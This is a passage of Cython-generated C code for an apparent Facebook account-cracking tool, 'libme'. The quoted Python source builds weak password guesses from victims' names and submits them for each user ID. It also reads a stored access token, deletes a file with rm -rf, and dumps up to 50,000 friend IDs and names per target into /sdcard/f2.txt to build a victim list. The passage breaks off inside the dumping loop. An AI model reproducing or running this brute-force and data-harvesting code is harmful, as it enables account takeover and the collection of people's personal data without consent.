  __Pyx_AddTraceback("libme.James.__1000__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_line);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_ft);
  __Pyx_XDECREF(__pyx_v_pwx);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":473
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __masal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_31__masal2__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_31__masal2__ = {"__masal2__", (PyCFunction)__pyx_pw_5libme_5James_31__masal2__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_31__masal2__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__masal2__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_30__masal2__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_30__masal2__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self) {
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_v___total = NULL;
  PyObject *__pyx_v_____ = NULL;
  PyObject *__pyx_v_zx = NULL;
  PyObject *__pyx_v___ids = NULL;
  PyObject *__pyx_v_rex = NULL;
  PyObject *__pyx_v_ex = NULL;
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_id = NULL;
  PyObject *__pyx_v_a = NULL;
  PyObject *__pyx_v___id = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  Py_ssize_t __pyx_t_9;
  PyObject *(*__pyx_t_10)(PyObject *);
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  PyObject *(*__pyx_t_13)(PyObject *);
  int __pyx_t_14;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__masal2__", 0);

  /* "libme.pyx":474
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __masal2__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":475
 * 	def __masal2__(self):
 * 		try:
 * 			token=open('login.txt', 'r').read()             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 475, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 475, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 475, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_token = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "libme.pyx":474
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __masal2__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "libme.pyx":476
 * 		try:
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("  [!] Token invalid")
 * 		try:
 */
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("libme.James.__masal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 476, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);

      /* "libme.pyx":477
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")             # <<<<<<<<<<<<<<
 * 		try:
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 */
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 477, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":474
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __masal2__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":478
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 * 		except:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_1);
    /*try:*/ {

      /* "libme.pyx":479
 * 			exit("  [!] Token invalid")
 * 		try:
 * 			__total = int(input("\n  [?] How much account u want dump : "))             # <<<<<<<<<<<<<<
 * 		except:
 * 			__total = 1
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__44, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 479, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyNumber_Int(__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 479, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v___total = __pyx_t_6;
      __pyx_t_6 = 0;

      /* "libme.pyx":478
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 * 		except:
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    goto __pyx_L16_try_end;
    __pyx_L11_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "libme.pyx":480
 * 		try:
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 * 		except:             # <<<<<<<<<<<<<<
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/f2.txt")
 */
    /*except:*/ {
      __Pyx_AddTraceback("libme.James.__masal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_5, &__pyx_t_4) < 0) __PYX_ERR(0, 480, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":481
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 * 		except:
 * 			__total = 1             # <<<<<<<<<<<<<<
 * 		os.system("rm -rf /sdcard/f2.txt")
 * 		____ = ("/sdcard/f2.txt")
 */
      __Pyx_INCREF(__pyx_int_1);
      __Pyx_XDECREF_SET(__pyx_v___total, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L12_exception_handled;
    }
    __pyx_L13_except_error:;

    /* "libme.pyx":478
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [?] How much account u want dump : "))
 * 		except:
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    goto __pyx_L1_error;
    __pyx_L12_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    __pyx_L16_try_end:;
  }

  /* "libme.pyx":482
 * 		except:
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/f2.txt")             # <<<<<<<<<<<<<<
 * 		____ = ("/sdcard/f2.txt")
 * 		for zx in range(__total):
 */
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 482, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 482, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_kp_s_rm_rf_sdcard_f2_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s_rm_rf_sdcard_f2_txt);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 482, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":483
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/f2.txt")
 * 		____ = ("/sdcard/f2.txt")             # <<<<<<<<<<<<<<
 * 		for zx in range(__total):
 * 			zx += 1
 */
  __Pyx_INCREF(__pyx_kp_s_sdcard_f2_txt);
  __pyx_v_____ = __pyx_kp_s_sdcard_f2_txt;

  /* "libme.pyx":484
 * 		os.system("rm -rf /sdcard/f2.txt")
 * 		____ = ("/sdcard/f2.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v___total); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 484, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
    __pyx_t_6 = __pyx_t_4; __Pyx_INCREF(__pyx_t_6); __pyx_t_9 = 0;
    __pyx_t_10 = NULL;
  } else {
    __pyx_t_9 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 484, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_10 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 484, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  for (;;) {
    if (likely(!__pyx_t_10)) {
      if (likely(PyList_CheckExact(__pyx_t_6))) {
        if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 484, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 484, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      } else {
        if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 484, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 484, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      }
    } else {
      __pyx_t_4 = __pyx_t_10(__pyx_t_6);
      if (unlikely(!__pyx_t_4)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 484, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_4);
    }
    __Pyx_XDECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":485
 * 		____ = ("/sdcard/f2.txt")
 * 		for zx in range(__total):
 * 			zx += 1             # <<<<<<<<<<<<<<
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 */
    __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_v_zx, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 485, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":486
 * 		for zx in range(__total):
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")             # <<<<<<<<<<<<<<
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 */
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__36, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 486, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_XDECREF_SET(__pyx_v___ids, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":487
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);
      /*try:*/ {

        /* "libme.pyx":488
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))             # <<<<<<<<<<<<<<
 * 				ex=json.loads(rex.text)
 * 				file = open(____ , 'a')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 488, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 488, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 488, __pyx_L21_error) }
        __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 488, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_INCREF(__pyx_v___ids);
        __Pyx_GIVEREF(__pyx_v___ids);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v___ids);
        __Pyx_INCREF(__pyx_v_token);
        __Pyx_GIVEREF(__pyx_v_token);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_v_token);
        __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_https_graph_facebook_com_s_field, __pyx_t_5); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 488, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_5, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_11);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 488, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF_SET(__pyx_v_rex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":489
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)             # <<<<<<<<<<<<<<
 * 				file = open(____ , 'a')
 * 				id = []
 */
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_json); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 489, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_loads); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 489, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_rex, __pyx_n_s_text); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 489, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_5, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_8);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 489, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":490
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 * 				file = open(____ , 'a')             # <<<<<<<<<<<<<<
 * 				id = []
 * 				for a in ex['friends']['data']:
 */
        __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 490, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_v_____);
        __Pyx_GIVEREF(__pyx_v_____);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v_____);
        __Pyx_INCREF(__pyx_n_s_a);
        __Pyx_GIVEREF(__pyx_n_s_a);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_a);
        __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 490, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_file, __pyx_t_11);
        __pyx_t_11 = 0;

        /* "libme.pyx":491
 * 				ex=json.loads(rex.text)
 * 				file = open(____ , 'a')
 * 				id = []             # <<<<<<<<<<<<<<
 * 				for a in ex['friends']['data']:
 * 					id.append(a['id']+"|"+a['name'])
 */
        __pyx_t_11 = PyList_New(0); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 491, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_XDECREF_SET(__pyx_v_id, ((PyObject*)__pyx_t_11));
        __pyx_t_11 = 0;

        /* "libme.pyx":492
 * 				file = open(____ , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')
 */
        __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_v_ex, __pyx_n_s_friends); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 492, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_11, __pyx_n_s_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 492, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
          __pyx_t_11 = __pyx_t_4; __Pyx_INCREF(__pyx_t_11); __pyx_t_12 = 0;
          __pyx_t_13 = NULL;
        } else {
          __pyx_t_12 = -1; __pyx_t_11 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 492, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_13 = Py_TYPE(__pyx_t_11)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 492, __pyx_L21_error)
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        for (;;) {
          if (likely(!__pyx_t_13)) {
            if (likely(PyList_CheckExact(__pyx_t_11))) {
              if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyList_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 492, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 492, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            } else {
              if (__pyx_t_12 >= PyTuple_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 492, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 492, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            }
          } else {
            __pyx_t_4 = __pyx_t_13(__pyx_t_11);
            if (unlikely(!__pyx_t_4)) {
              PyObject* exc_type = PyErr_Occurred();
              if (exc_type) {
                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                else __PYX_ERR(0, 492, __pyx_L21_error)
              }
              break;
            }
            __Pyx_GOTREF(__pyx_t_4);
          }
